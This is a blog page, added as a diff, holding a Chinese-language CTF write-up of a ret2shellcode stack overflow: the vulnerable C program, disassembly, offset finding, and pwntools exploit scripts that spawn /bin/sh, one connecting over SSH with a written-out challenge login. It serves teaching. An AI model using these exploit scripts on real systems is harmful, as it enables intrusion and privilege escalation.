@@ -1,0 +1,771 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon/warning.png">
+  <link rel="icon" href="/img/icon/warning.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="K0rz3n">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="题目    代码：123456789101112131415161718192021222324252627282930#include &lt;inttypes.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int main(int argc, char **argv)&#123;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2shellcode">
+<meta property="og:url" content="http://k0rz3n.com/2025/05/11/ret2shellcode/index.html">
+<meta property="og:site_name" content="K0rz3n&#39;s Blog">
+<meta property="og:description" content="题目    代码：123456789101112131415161718192021222324252627282930#include &lt;inttypes.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int main(int argc, char **argv)&#123;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://k0rz3n.com/2025/05/11/ret2shellcode/challenge2.png">
+<meta property="og:image" content="http://k0rz3n.com/2025/05/11/ret2shellcode/checksec.png">
+<meta property="og:image" content="http://k0rz3n.com/2025/05/11/ret2shellcode/tech1.png">
+<meta property="og:image" content="http://k0rz3n.com/2025/05/11/ret2shellcode/static-analysis1.png">
+<meta property="og:image" content="http://k0rz3n.com/2025/05/11/ret2shellcode/static-analysis2.png">
+<meta property="og:image" content="http://k0rz3n.com/2025/05/11/ret2shellcode/pwn1.png">
+<meta property="og:image" content="http://k0rz3n.com/2025/05/11/ret2shellcode/pwn2.png">
+<meta property="og:image" content="http://k0rz3n.com/2025/05/11/ret2shellcode/pwn3.png">
+<meta property="og:image" content="http://k0rz3n.com/2025/05/11/ret2shellcode/pwn4.png">
+<meta property="og:image" content="http://k0rz3n.com/2025/05/11/ret2shellcode/result.png">
+<meta property="article:published_time" content="2025-05-11T16:59:18.000Z">
+<meta property="article:modified_time" content="2025-08-20T13:55:33.881Z">
+<meta property="article:author" content="K0rz3n">
+<meta property="article:tag" content="二进制  漏洞  CTF">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://k0rz3n.com/2025/05/11/ret2shellcode/challenge2.png">
+  
+  
+  
+  <title>ret2shellcode - K0rz3n&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/macpanel.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"k0rz3n.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 60vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>K0rz3n&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/banner/icemountain.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ret2shellcode"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-05-11 17:59" pubdate>
+          May 11, 2025 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.7k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          15 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">ret2shellcode</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2>
+
+<img src="/2025/05/11/ret2shellcode/challenge2.png" srcset="/img/loading.gif" lazyload class="">
+
+<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs plain">#include &lt;inttypes.h&gt;<br>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br><br>int main(int argc, char **argv)<br>&#123;<br>    // This prevents /bin/sh from dropping the privileges<br>    setreuid(geteuid(), geteuid());<br><br>        unsigned long int n;<br>        char *endchar;<br>        char buf[64];<br><br>        if (argc != 2)<br>        &#123;<br>                fprintf(stderr, &quot;Please give a number\n&quot;);<br>                return 1;<br>        &#125;<br><br>        /* Convert the user&#x27;s number to an integer */<br>        n = strtoumax(argv[1], &amp;endchar, 10);<br><br>        printf(&quot;buffer is at %p\n&quot;, buf);<br><br>        if (read(STDIN_FILENO, buf, n) == 0)<br>                return 1;<br><br>        return 0;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="确认系统保护开启状态"><a href="#确认系统保护开启状态" class="headerlink" title="确认系统保护开启状态"></a>确认系统保护开启状态</h2><p>文件下载下来，并使用 checksec 查看，可以看到都是关闭状态</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">scp pwn025@pwn.baectf.com:/home/pwn025/runme ./runme<br>checksec runm<br></code></pre></td></tr></table></figure>
+
+<img src="/2025/05/11/ret2shellcode/checksec.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>检查文件平台为 x86-64</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">ubuntu@VM-0-10-ubuntu:~/ctf/stackoverflow/ret2shellcode$ file runme <br>runme: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=49c714829f0e52ddd585916e4ec5d462a4ccee4a, not stripped<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="技术讲解"><a href="#技术讲解" class="headerlink" title="技术讲解"></a>技术讲解</h2><p>我们的攻击方法可以简单分成3个部分来解释：</p>
+<ol>
+<li>对程序发送一段超过buffer长度的字串，产生overflow。</li>
+<li>因为overflow部分会继续被写入内存，最终会覆盖到内存中的return address，使其指向我们想要执行的shellcode。</li>
+<li>当程式执行完毕return时，就会被导向错误的内存地址，继续执行我们植入的shellcode。</li>
+</ol>
+<p>简单图解：(关于buffer overflow更详细的原理解释，可以参考<a href="#References">reference</a>中的前两个连结)</p>
+<img src="/2025/05/11/ret2shellcode/tech1.png" srcset="/img/loading.gif" lazyload class="">
+
+<h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs plain">pwndbg&gt; disassemble main<br>Dump of assembler code for function main:<br>   0x00000000000011e9 &lt;+0&gt;:     endbr64 <br>   0x00000000000011ed &lt;+4&gt;:     push   rbp<br>   0x00000000000011ee &lt;+5&gt;:     mov    rbp,rsp<br>   0x00000000000011f1 &lt;+8&gt;:     push   rbx<br>   0x00000000000011f2 &lt;+9&gt;:     sub    rsp,0x68<br>   0x00000000000011f6 &lt;+13&gt;:    mov    DWORD PTR [rbp-0x64],edi<br>   0x00000000000011f9 &lt;+16&gt;:    mov    QWORD PTR [rbp-0x70],rsi<br>   0x00000000000011fd &lt;+20&gt;:    call   0x10b0 &lt;geteuid@plt&gt;<br>   0x0000000000001202 &lt;+25&gt;:    mov    ebx,eax<br>   0x0000000000001204 &lt;+27&gt;:    call   0x10b0 &lt;geteuid@plt&gt;<br>   0x0000000000001209 &lt;+32&gt;:    mov    esi,ebx<br>   0x000000000000120b &lt;+34&gt;:    mov    edi,eax<br>   0x000000000000120d &lt;+36&gt;:    call   0x10d0 &lt;setreuid@plt&gt;<br>   0x0000000000001212 &lt;+41&gt;:    cmp    DWORD PTR [rbp-0x64],0x2<br>   0x0000000000001216 &lt;+45&gt;:    je     0x1242 &lt;main+89&gt;<br>   0x0000000000001218 &lt;+47&gt;:    mov    rax,QWORD PTR [rip+0x2e01]        # 0x4020 &lt;stderr@GLIBC_2.2.5&gt;<br>   0x000000000000121f &lt;+54&gt;:    mov    rcx,rax<br>   0x0000000000001222 &lt;+57&gt;:    mov    edx,0x15<br>   0x0000000000001227 &lt;+62&gt;:    mov    esi,0x1<br>   0x000000000000122c &lt;+67&gt;:    lea    rax,[rip+0xdd1]        # 0x2004<br>   0x0000000000001233 &lt;+74&gt;:    mov    rdi,rax<br>   0x0000000000001236 &lt;+77&gt;:    call   0x10f0 &lt;fwrite@plt&gt;<br>   0x000000000000123b &lt;+82&gt;:    mov    eax,0x1<br>   0x0000000000001240 &lt;+87&gt;:    jmp    0x12a6 &lt;main+189&gt;<br>   0x0000000000001242 &lt;+89&gt;:    mov    rax,QWORD PTR [rbp-0x70]<br>   0x0000000000001246 &lt;+93&gt;:    add    rax,0x8<br>   0x000000000000124a &lt;+97&gt;:    mov    rax,QWORD PTR [rax]<br>   0x000000000000124d &lt;+100&gt;:   lea    rcx,[rbp-0x20]<br>   0x0000000000001251 &lt;+104&gt;:   mov    edx,0xa<br>   0x0000000000001256 &lt;+109&gt;:   mov    rsi,rcx<br>   0x0000000000001259 &lt;+112&gt;:   mov    rdi,rax<br>   0x000000000000125c &lt;+115&gt;:   call   0x10e0 &lt;strtoumax@plt&gt;<br>   0x0000000000001261 &lt;+120&gt;:   mov    QWORD PTR [rbp-0x18],rax<br>   0x0000000000001265 &lt;+124&gt;:   lea    rax,[rbp-0x60]<br>   0x0000000000001269 &lt;+128&gt;:   mov    rsi,rax<br>   0x000000000000126c &lt;+131&gt;:   lea    rax,[rip+0xda7]        # 0x201a<br>   0x0000000000001273 &lt;+138&gt;:   mov    rdi,rax<br>   0x0000000000001276 &lt;+141&gt;:   mov    eax,0x0<br>   0x000000000000127b &lt;+146&gt;:   call   0x10a0 &lt;printf@plt&gt;<br>   0x0000000000001280 &lt;+151&gt;:   mov    rdx,QWORD PTR [rbp-0x18]<br>   0x0000000000001284 &lt;+155&gt;:   lea    rax,[rbp-0x60]<br>   0x0000000000001288 &lt;+159&gt;:   mov    rsi,rax<br>   0x000000000000128b &lt;+162&gt;:   mov    edi,0x0<br>   0x0000000000001290 &lt;+167&gt;:   call   0x10c0 &lt;read@plt&gt;<br>   0x0000000000001295 &lt;+172&gt;:   test   rax,rax<br>   0x0000000000001298 &lt;+175&gt;:   jne    0x12a1 &lt;main+184&gt;<br>   0x000000000000129a &lt;+177&gt;:   mov    eax,0x1<br>   0x000000000000129f &lt;+182&gt;:   jmp    0x12a6 &lt;main+189&gt;<br>   0x00000000000012a1 &lt;+184&gt;:   mov    eax,0x0<br>   0x00000000000012a6 &lt;+189&gt;:   mov    rbx,QWORD PTR [rbp-0x8]<br>   0x00000000000012aa &lt;+193&gt;:   leave  <br>   0x00000000000012ab &lt;+194&gt;:   ret    <br>End of assembler dump.<br></code></pre></td></tr></table></figure>
+
+<p>根据 IDA的反编译我们也可以看到  buf 的地址就是这个位置，将buf地址复制给到 rsi 作为函数的第二个参数，使用快捷键B可以看到相对于 ebp 的地址偏移位 60h</p>
+<img src="/2025/05/11/ret2shellcode/static-analysis1.png" srcset="/img/loading.gif" lazyload class="">
+
+<img src="/2025/05/11/ret2shellcode/static-analysis2.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>根据函数调用的调用范式，我们知道返回地址大概率存在于 rbp+0x8的位置，也就是 buf 和 retrun 的相对距离为 68h, 但是为了确定我们再动态调试进行计算看看是否如我们所料</p>
+<p>我们构造一个超长的payload，让程序崩溃</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">python3 -c &#x27;print(&quot;A&quot; * 200)&#x27; &gt; payload.txt<br></code></pre></td></tr></table></figure>
+
+<p>使用 gdb 进行调试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">gdb<br>file ret2shellcode<br>run 200 &lt; payload.txt<br></code></pre></td></tr></table></figure>
+
+<p>可以看到 rsp 此时的地址为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">rsp:0x7fffffffe2c8<br>buf:0x7fffffffe260<br></code></pre></td></tr></table></figure>
+
+<p>为什么要这么调试呢，我们知道函数最后是 leave 和 ret , leave 的作用是退栈，也就是还原栈的位置，相当于下面的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">mov esp ebp<br>pop ebp<br></code></pre></td></tr></table></figure>
+
+<p>ret 则是负责 return 到之前存储的返回地址，相当于下面的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">pop rax<br>jmp rax<br></code></pre></td></tr></table></figure>
+
+<p>而这里的 pop 就是把 rsp 指向的地址的内容 pop出来，这个地址内容就是return的目标地址，因此 rsp 的地址就是 return 地址的存储位置，也就是我们要覆盖的地址空间</p>
+<img src="/2025/05/11/ret2shellcode/pwn1.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>同理我们下断点进行调试，当断点执行到 ret 指令的时候我们查看 rsp 的值，这样我们也能获得到对应的 return 地址所在的地址空间</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">b read //在read 函数下断点<br>run<br>ni<br></code></pre></td></tr></table></figure>
+
+<img src="/2025/05/11/ret2shellcode/pwn2.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>或者使用 pwntools 的 cyclic 生成字符帮我们计算</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">pwndbg&gt; cyclic 200<br>aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa<br>// 将字符复制到 payload2.txt 中，并开启调试<br>run 200 &lt; payload2.txt<br></code></pre></td></tr></table></figure>
+
+<p>找到被覆盖的位置，并把覆盖的值输入 cyclic 让他帮我们计算</p>
+<img src="/2025/05/11/ret2shellcode/pwn3.png" srcset="/img/loading.gif" lazyload class="">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">pwndbg&gt; cyclic -l 0x616161616161616e<br></code></pre></td></tr></table></figure>
+
+<img src="/2025/05/11/ret2shellcode/pwn4.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>可以看到计算的结果 104 就等于我们之前算到的 68h，至此，我们可以分析得出，我们的payload的长度为 68h+8h 字节，接下来我们要分析shellcode</p>
+<p>shellcode 是一段16进制的代码，可以直接注入内存并被直接执行，简单的shellcode目前有现成的平台供我们搜索：<a target="_blank" rel="noopener" href="https://shell-storm.org/shellcode/index.html">https://shell-storm.org/shellcode/index.html</a>(shell-storm上有非常多针对不同的作业系统和CPU，执行不同功能的shellcode，我们只要在网站上，根据我们的作业系统及CPU指令集选择合适的shellcode来用即可)， 或者对于我们只需要执行&#x2F;bin&#x2F;sh 我们可以直接使用pwntools 为我们提供的能力</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">shellcode = asm(shellcraft.amd64.linux.sh(), arch=&#x27;amd64&#x27;)<br>payload = shellcode.ljust(104, b&#x27;A&#x27;)+p64(0x7fffffffea00)<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>下面我们看下 shellcode 的长度是不是超过了 104，只有48 是满足要求的</p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>len(asm(shellcraft.amd64.linux.sh(), arch&#x3D;’amd64’))   </p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p>48                  </p>
+</blockquote>
+<p>构造我们的本地调试的 exp.py</p>
+<blockquote>
+<p>我们分析的时候程序的 buf 地址发生了一些变化，但是整体的相对地址是不会变化的，这里我们只需要在脚本里修改一下即可</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br><br># 设置连接信息<br>executable_path = &#x27;./ret2shellcode&#x27;  # 可执行文件的路径<br><br># payload 构造<br>shellcode = asm(shellcraft.amd64.linux.sh(), arch=&#x27;amd64&#x27;)<br>payload = shellcode.ljust(104, b&#x27;A&#x27;)+p64(0x7fffffffe2d0)<br><br>target_program = process([executable_path, &#x27;200&#x27;])<br><br>target_program.sendline(payload)<br><br>try:<br>    # 设置超时时间为 5 秒<br>    output = target_program.recv(timeout=5)  # 接收最多 5 秒的输出<br>    print(output.decode())  # 输出接收到的内容<br>except Exception as e:<br>    print(f&quot;Error: &#123;e&#125;&quot;)<br><br># 如果需要进一步交互，可以使用 interactive() 函数进入交互模式<br>target_program.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>远程的代码，要使用到 ssh连接，并且 buf 地址也是不一样的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br><br># 设置连接信息<br>target_ip = &#x27;pwn.baectf.com&#x27;  # 远程主机的 IP 地址<br>target_port = 22  # 默认的 SSH 端口<br>username = &#x27;pwn025&#x27;  # SSH 用户名<br>password = &#x27;butterscotchtopping&#x27;  # SSH 密码<br>executable_path = &#x27;./runme&#x27;  # 可执行文件的路径<br><br># payload 构造<br>shellcode = asm(shellcraft.amd64.linux.sh(), arch=&#x27;amd64&#x27;)<br>payload = shellcode.ljust(104, b&#x27;A&#x27;)+p64(0x7fffffffea40)<br><br><br># 通过 SSH 连接到远程主机<br>p = ssh(host=target_ip, user=username, password=password, port=target_port)<br><br># 在远程主机上执行可执行文件，并传递 payload 作为命令行参数<br>target_program = p.process([executable_path, &#x27;200&#x27;])<br><br>target_program.sendline(payload)<br><br>try:<br>    # 设置超时时间为 5 秒<br>    output = target_program.recv(timeout=5)  # 接收最多 5 秒的输出<br>    print(output.decode())  # 输出接收到的内容<br>except Exception as e:<br>    print(f&quot;Error: &#123;e&#125;&quot;)<br><br># 如果需要进一步交互，可以使用 interactive() 函数进入交互模式<br>target_program.interactive()<br></code></pre></td></tr></table></figure>
+
+
+<img src="/2025/05/11/ret2shellcode/result.png" srcset="/img/loading.gif" lazyload class="">
+
+
+
+
+
+
+
+
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%BC%8F%E6%B4%9E-CTF/" class="print-no-link">#二进制  漏洞  CTF</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ret2shellcode</div>
+      <div>http://k0rz3n.com/2025/05/11/ret2shellcode/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>K0rz3n</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>May 11, 2025</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="NC - Non-commercial">
+                    <i class="iconfont icon-cc-nc"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="SA - Share-alike">
+                    <i class="iconfont icon-cc-sa"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/05/10/simple-stackoverflow/" title="Simple Sstackoverflow">
